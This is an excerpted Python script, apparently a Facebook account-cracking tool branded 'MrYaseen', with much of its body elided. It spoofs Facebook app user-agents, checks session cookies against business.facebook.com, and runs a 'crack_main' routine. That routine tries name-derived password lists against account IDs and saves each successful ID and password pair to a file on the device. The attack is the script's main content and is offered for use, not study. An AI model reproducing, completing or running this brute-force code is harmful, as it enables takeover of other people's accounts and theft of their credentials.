...
#----[pran links]-----
kkk = {'user-agent': '[FBAN/FB4A;FBAV/271.0.0.2.71;FBBV/39790256;[FBAN/FB4A;FBAV/249.0.0.17.29;FBBV/19272999;FBDM/{density=1.0,width=1280,height=752};FBLC/en_US;FBCR/o2 - de;FBPN/com.facebook.katana;FBDV/GT-I9500;FBSV/13.1.3;FBOP/1;FBCA/armeabi-v7a:armeabi;]',}
...
888    d8P   .d88888b.  888    d8P   .d88888b.  
888   d8P   d88P" "Y88b 888   d8P   d88P" "Y88b 
888  d8P    888     888 888  d8P    888     888 
888d88K     888     888 888d88K     888     888 
8888888b    888     888 8888888b    888     888 
888  Y88b   888     888 888  Y88b   888     888 
888   Y88b  Y88b. .d88P 888   Y88b  Y88b. .d88P 
888    Y88b  "Y88888P"  888    Y88b  "Y88888P" 
...
def login():
        ...
        try:
                print('\n Validating cookies ... ')
                data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Infinix X692 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.92 Mobile Safari/537.36 ","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookies})
...
class crack_main():
        ...
        def m1(self,iid,name,passlist):
                try:
                        ...
                        sys.stdout.write('\r[MrYaseen] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
                        fn = name.split(' ')[0]
                        try:
                                ln = name.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in po:
                                        print(' \033[1;32m[MrYaseen-OK] '+roid+' | '+pas+'\033[0;97m')
                                        open('/sdcard/MrYaseen_ok.txt','a').write(roid+'|'+pas+'\n')
                                        ok.append(iid)
                                        break
        ...
        def pasw(self):
                ...
                print(' Ok Ids Save In : /sdcard/MrYaseen_ok.txt')
                print(50*'-')
                input('\n Press enter to back ')
                main()
